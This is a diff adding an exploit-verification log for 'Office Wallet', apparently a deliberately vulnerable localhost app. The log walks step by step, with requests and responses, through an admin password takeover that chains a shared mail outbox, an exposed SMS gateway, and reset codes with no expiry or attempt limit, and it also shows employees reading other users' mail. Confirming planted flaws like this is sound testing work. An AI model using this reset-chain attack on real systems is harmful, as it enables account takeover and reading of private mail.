@@ -1,0 +1,69 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-27
+################################################################################################
+--- проверка 1/3 ---
+== 3. OW-26/OW-27: полный захват пароля жертвы через сброс ==
+    · Сброс чужого пароля собирается из трёх кусков, и все три уже у нас:
+    ·  1) ссылка уходит на почту жертвы, но /mail отдаёт весь outbox любому вошедшему
+    ·     (handlers_auth.go:181-200) — забираем её оттуда;
+    ·  2) код подтверждения лежит в SMS-шлюзе, открытом кукой из шага 2;
+    ·  3) срок действия кода не проверяется и лимита попыток нет (handlers_auth.go:146).
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → POST /password/forgot  login=adminw (письмо и SMS уходят в общие ящики)
+    ← HTTP 302 redirect=http://localhost:18081/password/forgot  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сброс пароля · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → GET /mail  (весь outbox виден иванову)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → GET /gateway/sms  (код по заявке #43)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    ссылка: /password/reset?rid=43   код: 673407
+    → POST /password/reset  rid=43&sms_code=673407&password=Hack1234
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$7RaARAmS4/VeSpErIzadquTgcFRSRRRpafp9dEjpKQ2dulhMCa5R2
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-26/OW-27 · сброс сменил пароль жертвы
+    │ reset request rid=43 sms_code=<получен из gateway> → HTTP 200
+    │ password_hash изменён: $2a$10$.WcgUxFiEZL… → $2a$10$7RaARAmS4/V…
+    │ POST /login новым паролем → HTTP 302 (сессия выдана)
+    └─
+[+] пароль админа заменён, зашли: adminw / Hack1234
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    пароль adminw восстановлен: hash совпал=True
+
+--- проверка 2/3 ---
+== 5. OW-27: вся почта компании в одном ящике ==
+    · /mail отдаёт весь mail_outbox любому вошедшему (handlers_auth.go:181-200):
+    · письма других людей, ссылки сброса паролей, служебные уведомления — без
+    · фильтра по адресату. Это вторая половина цепочки захвата пароля (stage_access).
+    → GET /mail  (весь outbox)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    писем в outbox: 37 (включая строку шапки)
+    тема: Сброс пароля
+    тема: Сброс пароля
+    тема: Сброс пароля
+    → SQL SELECT email FROM users WHERE login='ivanov'
+    ← psql ivanov@office.local
+    ┌─ АРТЕФАКТ · OW-27 · сотрудник видит почту других адресатов
+    │ GET /mail → HTTP 200; адрес текущего пользователя: ivanov@office.local
+    │ адреса в ответе: adminw@office.local, adminw@office.local, sidorov@office.local, adminw@office.local, adminw@office.local
+    │ письма/ссылки из общего mail_outbox отображены в одном ответе
+    └─
+[+] все письма видны без чужого адреса
+
+--- проверка 3/3 ---
+== OW-27 · сотрудник читает письма чужих адресатов ==
+    → GET /mail as employee
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → SQL SELECT email FROM users WHERE login='ivanov'
+    ← psql ivanov@office.local
+    ┌─ АРТЕФАКТ · OW-27 · общий outbox показывает чужие письма
+    │ GET /mail under ivanov <ivanov@office.local> → HTTP 200
+    │ чужие recipient в HTML: adminw@office.local, adminw@office.local, sidorov@office.local, adminw@office.local, adminw@office.local, adminw@office.local
+    └─
+[+] employee видит сообщения не своего почтового адреса
